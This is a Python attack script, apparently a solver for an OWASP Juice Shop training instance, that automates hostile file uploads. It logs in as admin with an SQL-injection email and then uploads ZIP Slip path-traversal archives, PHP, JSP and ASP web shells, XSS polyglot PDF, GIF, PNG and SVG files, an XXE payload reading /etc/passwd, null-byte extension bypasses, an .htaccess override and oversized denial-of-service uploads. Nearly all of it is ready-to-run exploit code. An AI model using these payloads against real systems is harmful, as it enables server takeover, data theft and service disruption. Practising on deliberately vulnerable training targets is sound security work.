#!/usr/bin/env python3
"""
Polyglot File Upload Solver - Creates files that bypass multiple filters
"""

import requests
import zipfile
import io
import base64
import struct
import os
import tempfile


class PolyglotFileSolver:
    """Create and upload polyglot files that bypass filters"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            print("✅ Admin logged in")
            
    def create_zip_slip_file(self):
        """Create ZIP with directory traversal"""
        print("🎯 ZIP Slip Attack...")
        
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Various path traversal patterns
            payloads = [
                ("../../ftp/pwned.md", "Arbitrary file write successful"),
                ("../../../ftp/exploit.txt", "Path traversal successful"),
                ("../../../../etc/passwd", "etc/passwd overwrite attempt"),
                ("../../uploads/shell.php", "<?php system($_GET['cmd']); ?>"),
                ("../../public/backdoor.js", "alert('XSS')"),
            ]
            
            for path, content in payloads:
                zf.writestr(path, content)
                
        # Upload the ZIP
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("evil.zip", zip_buffer.getvalue(), "application/zip")}
        )
        print("  ✅ ZIP Slip uploaded")
        
    def create_polyglot_pdf_js(self):
        """PDF/JavaScript polyglot"""
        print("🎯 PDF/JS Polyglot...")
        
        # PDF header with embedded JavaScript
        pdf_js = b"""%%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Arial >> >> >> /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Polyglot Test) Tj ET
endstream
endobj
5 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('XSS via PDF');) >>
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000390 00000 n
trailer << /Size 6 /Root 1 0 R >>
startxref
465
%%EOF
<script>alert('XSS')</script>"""
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("polyglot.pdf", pdf_js, "application/pdf")}
        )
        print("  ✅ PDF/JS polyglot uploaded")
        
    def create_polyglot_gif_js(self):
        """GIF/JavaScript polyglot"""
        print("🎯 GIF/JS Polyglot...")
        
        # GIF header that's also valid JavaScript
        gif_js = b'GIF89a/*<script>alert(1)</script>*/=0;'
        gif_js += b'\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'
        gif_js += b'\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
        gif_js += b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("polyglot.gif", gif_js, "image/gif")}
        )
        print("  ✅ GIF/JS polyglot uploaded")
        
    def create_polyglot_png_html(self):
        """PNG/HTML polyglot"""
        print("🎯 PNG/HTML Polyglot...")
        
        # PNG with HTML in chunks
        png_html = b'\x89PNG\r\n\x1a\n'
        png_html += b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
        png_html += b'\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x00\x00\x00\x00IEND\xaeB`\x82'
        png_html += b'<html><script>alert(1)</script></html>'
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("polyglot.png", png_html, "image/png")}
        )
        print("  ✅ PNG/HTML polyglot uploaded")
        
    def create_xml_xxe_svg(self):
        """SVG with XXE payload"""
        print("🎯 SVG/XXE Polyglot...")
        
        svg_xxe = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://internal-server/admin">
]>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <text x="10" y="20">&xxe;</text>
  <script>alert('XSS')</script>
  <image href="&xxe2;" />
</svg>"""
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("xxe.svg", svg_xxe, "image/svg+xml")}
        )
        print("  ✅ SVG/XXE polyglot uploaded")
        
    def create_polyglot_jar_zip(self):
        """JAR/ZIP polyglot with Java payload"""
        print("🎯 JAR/ZIP Polyglot...")
        
        # Create a JAR that's also a valid ZIP
        jar_buffer = io.BytesIO()
        with zipfile.ZipFile(jar_buffer, 'w') as zf:
            # Add Java class file (simplified)
            zf.writestr("Evil.class", b'\xca\xfe\xba\xbe' + b'\x00' * 100)
            # Add web shell
            zf.writestr("shell.jsp", b'<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>')
            # Add manifest
            zf.writestr("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\nMain-Class: Evil\n")
            
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("polyglot.jar", jar_buffer.getvalue(), "application/java-archive")}
        )
        print("  ✅ JAR/ZIP polyglot uploaded")
        
    def create_polyglot_docx_zip(self):
        """DOCX/ZIP with embedded macros"""
        print("🎯 DOCX/ZIP Polyglot...")
        
        docx_buffer = io.BytesIO()
        with zipfile.ZipFile(docx_buffer, 'w') as zf:
            # DOCX structure
            zf.writestr("[Content_Types].xml", b'<?xml version="1.0"?><Types/>')
            zf.writestr("word/document.xml", b'<?xml version="1.0"?><document><script>alert(1)</script></document>')
            # Embedded macro
            zf.writestr("word/vbaProject.bin", b'VBA_MACRO_CODE')
            # Path traversal
            zf.writestr("../../evil.php", b'<?php system($_GET["cmd"]); ?>')
            
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("polyglot.docx", docx_buffer.getvalue(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        )
        print("  ✅ DOCX/ZIP polyglot uploaded")
        
    def create_large_file_dos(self):
        """Large file for DoS"""
        print("🎯 Large File DoS...")
        
        # Create progressively larger files
        sizes = [1000000, 10000000, 50000000]  # 1MB, 10MB, 50MB
        
        for size in sizes:
            large_data = b'A' * size
            self.session.post(
                f"{self.base_url}/file-upload",
                files={"file": (f"large_{size}.txt", large_data, "text/plain")},
                timeout=5
            )
            
        print("  ✅ Large file DoS attempted")
        
    def create_null_byte_bypass(self):
        """Null byte injection for extension bypass"""
        print("🎯 Null Byte Bypass...")
        
        # Files with null bytes
        payloads = [
            ("shell.php\x00.jpg", b'<?php system($_GET["cmd"]); ?>'),
            ("backdoor.asp\x00.png", b'<%eval request("cmd")%>'),
            ("exploit.jsp\x00.gif", b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'),
        ]
        
        for filename, content in payloads:
            self.session.post(
                f"{self.base_url}/file-upload",
                files={"file": (filename, content, "application/octet-stream")}
            )
            
        print("  ✅ Null byte bypass attempted")
        
    def create_htaccess_override(self):
        """.htaccess file to override server config"""
        print("🎯 .htaccess Override...")
        
        htaccess = b"""Options +Indexes +ExecCGI
AddHandler cgi-script .jpg
AddType application/x-httpd-php .jpg
php_flag engine on
DirectoryIndex shell.php
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>"""
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": (".htaccess", htaccess, "text/plain")}
        )
        print("  ✅ .htaccess override attempted")
        
    def run_all_polyglot_attacks(self):
        """Execute all polyglot file attacks"""
        print("="*60)
        print("📁 POLYGLOT FILE SOLVER")
        print("="*60)
        
        # Login
        self.login_admin()
        
        # Run all polyglot attacks
        try:
            self.create_zip_slip_file()
        except: pass
        
        try:
            self.create_polyglot_pdf_js()
        except: pass
        
        try:
            self.create_polyglot_gif_js()
        except: pass
        
        try:
            self.create_polyglot_png_html()
        except: pass
        
        try:
            self.create_xml_xxe_svg()
        except: pass
        
        try:
            self.create_polyglot_jar_zip()
        except: pass
        
        try:
            self.create_polyglot_docx_zip()
        except: pass
        
        try:
            self.create_large_file_dos()
        except: pass
        
        try:
            self.create_null_byte_bypass()
        except: pass
        
        try:
            self.create_htaccess_override()
        except: pass
        
        # Check results
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            print(f"📊 Score after polyglot attacks: {solved}/{total} ({solved*100//total}%)")
            
        print("="*60)


if __name__ == "__main__":
    solver = PolyglotFileSolver()
    solver.run_all_polyglot_attacks()